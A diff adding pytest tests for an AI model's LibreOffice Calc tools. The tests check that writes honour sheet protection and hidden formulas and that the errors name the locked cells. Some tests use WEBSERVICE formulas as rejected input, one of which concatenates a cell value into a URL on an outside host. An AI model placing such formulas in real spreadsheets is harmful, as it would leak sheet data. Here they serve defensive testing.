@@ -274,6 +274,123 @@ def test_calc_set_formula_accepts_a_text_result_that_looks_like_an_error(formula
     assert shown in result.content
 
 
+def _protected_sheet(grid=None, unlocked=()):
+    """Feuille protégée : comme dans Calc, toute cellule y est verrouillée,
+    sauf celles que l'auteur du classeur a déverrouillées."""
+    sheet = FakeCalcSheet(grid=grid)
+    sheet.protected = True
+    sheet.unlocked.update(unlocked)
+    return sheet
+
+
+def test_calc_set_formula_leaves_a_locked_cell_of_a_protected_sheet_as_it_was():
+    """Calc refuse la saisie dans une cellule verrouillée ; l'assistant aussi,
+    et le modèle apprend quelle cellule et pourquoi."""
+    sheet = _protected_sheet({(2, 0): "24"})
+    sheet.formulas[(2, 0)] = "=A1*2"
+    result = _registry().call_tool(
+        "calc_set_formula", {"ref": "C1", "formula": "=A1*3"}, _calc_ctx(FakeCalcDoc(sheet)))
+    assert not result.ok
+    assert result.error == "C1 : cellule verrouillée (feuille protégée)"
+    assert sheet.formulas[(2, 0)] == "=A1*2"
+    assert sheet.grid[(2, 0)] == "24"
+
+
+def test_calc_set_formula_leaves_an_unlocked_hide_all_cell_of_a_protected_sheet_as_it_was():
+    """Calc refuse aussi la saisie dans une cellule « Masquer tout » d'une
+    feuille protégée, même déverrouillée."""
+    sheet = _protected_sheet({(2, 0): "24"}, unlocked={(2, 0)})
+    sheet.hidden_cells.add((2, 0))
+    result = _registry().call_tool(
+        "calc_set_formula", {"ref": "C1", "formula": "=A1*3"}, _calc_ctx(FakeCalcDoc(sheet)))
+    assert not result.ok
+    assert result.error == "C1 : cellule verrouillée (feuille protégée)"
+    assert sheet.formulas == {}
+    assert sheet.grid[(2, 0)] == "24"
+
+
+def test_calc_set_formula_applies_in_a_hide_all_cell_of_an_unprotected_sheet():
+    sheet = FakeCalcSheet()
+    sheet.hidden_cells.add((2, 0))
+    sheet.formula_results["=A1*3"] = "36"
+    result = _registry().call_tool(
+        "calc_set_formula", {"ref": "C1", "formula": "=A1*3"}, _calc_ctx(FakeCalcDoc(sheet)))
+    assert result.ok
+    assert sheet.formulas[(2, 0)] == "=A1*3"
+
+
+def test_calc_set_formula_applies_in_an_unlocked_cell_of_a_protected_sheet():
+    sheet = _protected_sheet(unlocked={(2, 0)})
+    sheet.formula_results["=A1*3"] = "36"
+    result = _registry().call_tool(
+        "calc_set_formula", {"ref": "C1", "formula": "=A1*3"}, _calc_ctx(FakeCalcDoc(sheet)))
+    assert result.ok
+    assert sheet.formulas[(2, 0)] == "=A1*3"
+
+
+def test_calc_set_formula_applies_in_a_hide_formula_cell_of_a_protected_sheet_when_unlocked():
+    """« Masquer la formule » ne bloque pas la saisie : Calc laisse taper une
+    formule dans une cellule déverrouillée, la masquer ne joue qu'à la lecture."""
+    sheet = _protected_sheet(unlocked={(2, 0)})
+    sheet.hidden_formulas.add((2, 0))
+    sheet.formula_results["=A1*3"] = "36"
+    result = _registry().call_tool(
+        "calc_set_formula", {"ref": "C1", "formula": "=A1*3"}, _calc_ctx(FakeCalcDoc(sheet)))
+    assert result.ok
+    assert sheet.formulas[(2, 0)] == "=A1*3"
+
+
+def test_calc_write_cells_writes_the_unlocked_cells_and_names_each_locked_one():
+    """Sur une feuille protégée, l'assistant écrit là où l'utilisateur peut
+    saisir. Un texte à apostrophe initiale ne passe pas davantage."""
+    original = {(0, 0): "Titre", (0, 1): "Code"}
+    sheet = _protected_sheet(original, unlocked={(1, 0)})
+    result = _registry().call_tool(
+        "calc_write_cells",
+        {"cells": [{"ref": "A1", "value": "Autre titre"},
+                   {"ref": "B1", "value": "saisie"},
+                   {"ref": "A2", "value": "'0612"}]},
+        _calc_ctx(FakeCalcDoc(sheet)))
+    assert not result.ok
+    # Le modèle ne reçoit que l'erreur d'un appel en échec : elle dit aussi
+    # ce qui a été écrit.
+    assert result.error == ("1 cellule(s) écrite(s). Erreurs : "
+                            "A1 : cellule verrouillée (feuille protégée) | "
+                            "A2 : cellule verrouillée (feuille protégée)")
+    assert sheet.grid == {**original, (1, 0): "saisie"}
+
+
+def test_calc_write_cells_reports_locked_and_refused_cells_in_one_error():
+    """Un verrou parmi les refus suffit pour que l'erreur dise aussi ce qui a
+    été écrit, quel que soit le motif des autres refus."""
+    sheet = _protected_sheet({(0, 0): "Titre"}, unlocked={(1, 0), (2, 0)})
+    result = _registry().call_tool(
+        "calc_write_cells",
+        {"cells": [{"ref": "A1", "value": "x"},
+                   {"ref": "B1", "value": "=WEBSERVICE(A1)"},
+                   {"ref": "C1", "value": "ok"}]},
+        _calc_ctx(FakeCalcDoc(sheet)))
+    assert not result.ok
+    assert result.error == (
+        "1 cellule(s) écrite(s). Erreurs : A1 : cellule verrouillée (feuille protégée) | "
+        "B1: texte refusé, fonction(s) réseau ou fichier interdite(s) : WEBSERVICE")
+    assert sheet.grid[(0, 0)] == "Titre"
+    assert sheet.grid[(1, 0)].startswith("#ERREUR")
+    assert sheet.grid[(2, 0)] == "ok"
+
+
+def test_calc_write_cells_names_only_the_refused_cells_when_none_is_locked():
+    sheet = FakeCalcSheet()
+    result = _registry().call_tool(
+        "calc_write_cells",
+        {"cells": [{"ref": "B1", "value": "ok"},
+                   {"ref": "B2", "value": '=WEBSERVICE("http://exemple.fr/"&A1)'}]},
+        _calc_ctx(FakeCalcDoc(sheet)))
+    assert not result.ok
+    assert result.error.startswith("B2: texte refusé, ")
+    assert sheet.grid[(1, 0)] == "ok"
+
+
 def _fill_down(sheet, to_row):
     return _registry().call_tool(
         "calc_fill_formula_down", {"from_ref": "C2", "to_row": to_row},
@@ -335,6 +452,72 @@ def test_calc_fill_formula_down_refuses_and_names_the_cause(to_row, protected, c
     assert list(sheet.formulas) == [(2, 1)]
 
 
+def test_calc_fill_formula_down_writes_nothing_when_a_target_cell_is_locked():
+    """Une recopie à trous tromperait : elle se refuse en entier, et le modèle
+    apprend quelles cellules la retiennent."""
+    sheet = _protected_sheet({(0, 1): "1"}, unlocked={(2, 2), (2, 4)})
+    sheet.formulas[(2, 1)] = "=A2*2"
+    result = _fill_down(sheet, 5)
+    assert not result.ok
+    assert result.error == ("Formule de C2 non recopiée : C3:C5 contient des cellules "
+                            "verrouillées (feuille protégée).")
+    assert list(sheet.formulas) == [(2, 1)]
+
+
+def test_calc_fill_formula_down_refuses_when_only_the_last_target_row_is_locked():
+    sheet = _protected_sheet({(0, 1): "1"}, unlocked={(2, 2), (2, 3)})
+    sheet.formulas[(2, 1)] = "=A2*2"
+    result = _fill_down(sheet, 5)
+    assert not result.ok
+    assert result.error == ("Formule de C2 non recopiée : C3:C5 contient des cellules "
+                            "verrouillées (feuille protégée).")
+    assert list(sheet.formulas) == [(2, 1)]
+
+
+def test_calc_fill_formula_down_names_a_single_locked_target_as_one_cell():
+    sheet = _protected_sheet({(0, 1): "1"})
+    sheet.formulas[(2, 1)] = "=A2*2"
+    result = _fill_down(sheet, 3)
+    assert not result.ok
+    assert result.error == ("Formule de C2 non recopiée : C3 contient des cellules "
+                            "verrouillées (feuille protégée).")
+    assert sheet.formulas == {(2, 1): "=A2*2"}
+
+
+@pytest.mark.parametrize("hidden_by", ["hidden_formulas", "hidden_cells"],
+                         ids=["masquer_la_formule", "masquer_tout"])
+def test_calc_fill_formula_down_does_not_copy_a_formula_the_protection_hides(hidden_by):
+    """Une formule que la feuille protégée cache ne se recopie pas dans des
+    cellules où elle se lirait, et le refus n'en cite rien."""
+    sheet = _protected_sheet({(0, 1): "1"}, unlocked={(2, 2), (2, 3)})
+    sheet.formulas[(2, 1)] = "=WEBSERVICE(A2)"
+    getattr(sheet, hidden_by).add((2, 1))
+    result = _fill_down(sheet, 4)
+    assert not result.ok
+    assert result.error == ("Formule de C2 non recopiée : la protection de la feuille "
+                            "la masque.")
+    assert list(sheet.formulas) == [(2, 1)]
+
+
+def test_calc_fill_formula_down_copies_a_hidden_formula_once_the_sheet_is_unprotected():
+    """Comme à la lecture, « Masquer la formule » ne joue que feuille protégée."""
+    sheet = FakeCalcSheet(grid={(0, 1): "1"})
+    sheet.formulas[(2, 1)] = "=A2*2"
+    sheet.hidden_formulas.add((2, 1))
+    result = _fill_down(sheet, 3)
+    assert result.ok
+    assert sheet.formulas[(2, 2)] == "=A3*2"
+
+
+def test_calc_fill_formula_down_fills_the_unlocked_cells_of_a_protected_sheet():
+    sheet = _protected_sheet({(0, 1): "1"}, unlocked={(2, 2), (2, 3), (2, 4)})
+    sheet.formulas[(2, 1)] = "=A2*2"
+    result = _fill_down(sheet, 5)
+    assert result.ok
+    assert sheet.formulas == {(2, 1): "=A2*2", (2, 2): "=A3*2", (2, 3): "=A4*2",
+                              (2, 4): "=A5*2"}
+
+
 def test_calc_result_column_of_a_whole_column_scans_only_the_used_rows():
     sheet = FakeCalcSheet(grid={(0, 0): "a", (0, 1): "b"}, num_rows=1048576)
     doc = FakeCalcDoc(sheet, selection_ref="A1:A1048576")
@@ -343,6 +526,55 @@ def test_calc_result_column_of_a_whole_column_scans_only_the_used_rows():
     assert result.ok
     assert (sheet.grid[(1, 0)], sheet.grid[(1, 1)]) == ("A", "B")
     assert sheet.cells_asked < 30
+
+
+@pytest.mark.parametrize("unlocked", [{(2, 0), (2, 1)}, {(2, 1), (2, 2)}],
+                         ids=["seule_cellule_de_resultat_verrouillee", "seul_en_tete_verrouille"])
+def test_calc_result_column_writes_nothing_when_one_of_its_cells_is_locked(unlocked):
+    """Une colonne de résultats à trous tromperait : l'en-tête et chaque
+    résultat doivent pouvoir s'écrire, sinon rien ne l'est."""
+    # Colonne B occupée : les résultats vont en C, sous un en-tête en C1.
+    original = {(0, 0): "Nom", (1, 0): "Autre", (0, 1): "a", (1, 1): "pris", (0, 2): "b"}
+    sheet = _protected_sheet(original, unlocked)
+    doc = FakeCalcDoc(sheet, selection_ref="A2:A3")
+    result = _registry().call_tool("calc_write_result_column",
+                                   {"values": ["A", "B"]}, _calc_ctx(doc))
+    assert not result.ok
+    assert result.error == ("Résultats non écrits : la colonne C contient des cellules "
+                            "verrouillées (feuille protégée).")
+    assert sheet.grid == original
+
+
+def test_calc_result_column_fills_the_unlocked_cells_of_a_protected_sheet():
+    original = {(0, 0): "Nom", (1, 0): "Autre", (0, 1): "a", (1, 1): "pris", (0, 2): "b"}
+    sheet = _protected_sheet(original, unlocked={(2, 0), (2, 1), (2, 2)})
+    doc = FakeCalcDoc(sheet, selection_ref="A2:A3")
+    result = _registry().call_tool("calc_write_result_column",
+                                   {"values": ["A", "B"]}, _calc_ctx(doc))
+    assert result.ok
+    assert sheet.grid == {**original, (2, 0): "Résultat IA", (2, 1): "A", (2, 2): "B"}
+
+
+def test_calc_result_column_leaves_the_locked_cells_it_does_not_write_alone():
+    sheet = _protected_sheet({(0, 1): "a", (0, 2): "b", (0, 3): "c"}, unlocked={(1, 1), (1, 2)})
+    doc = FakeCalcDoc(sheet, selection_ref="A2:A4")
+    result = _registry().call_tool("calc_write_result_column",
+                                   {"values": ["A", "B"]}, _calc_ctx(doc))
+    assert result.ok
+    assert sheet.grid[(1, 1)] == "A" and sheet.grid[(1, 2)] == "B"
+    assert (1, 0) not in sheet.grid and (1, 3) not in sheet.grid
+
+
+def test_calc_result_column_ignores_a_locked_cell_below_the_selection():
+    """Une valeur de trop n'est pas écrite : la cellule sous la sélection peut
+    rester verrouillée."""
+    sheet = _protected_sheet({(0, 1): "a", (0, 2): "b"}, unlocked={(1, 1), (1, 2)})
+    doc = FakeCalcDoc(sheet, selection_ref="A2:A3")
+    result = _registry().call_tool("calc_write_result_column",
+                                   {"values": ["A", "B", "C"]}, _calc_ctx(doc))
+    assert result.ok
+    assert sheet.grid[(1, 1)] == "A" and sheet.grid[(1, 2)] == "B"
+    assert (1, 3) not in sheet.grid
 
 
 def test_calc_get_selection_overview():
